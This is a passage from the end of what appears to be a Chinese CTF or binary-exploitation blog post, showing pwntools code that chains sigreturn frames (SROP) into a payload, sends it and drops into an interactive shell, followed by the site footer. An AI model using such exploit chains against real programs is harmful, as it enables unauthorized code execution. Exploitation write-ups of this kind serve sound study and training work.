style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">bbbb</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">cccc</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">payload1 </span><span style="color:#999999">+=</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#393A34">sigreturn_addr</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#998418"> bytes</span><span style="color:#2993a3">(</span><span style="color:#393A34">frame2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload1 </span><span style="color:#999999">+=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">aaaa</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">bbbb</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">cccc</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">payload1 </span><span style="color:#999999">+=</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#393A34">sigreturn_addr</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#998418"> bytes</span><span style="color:#2993a3">(</span><span style="color:#393A34">frame3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload1</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre></div></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>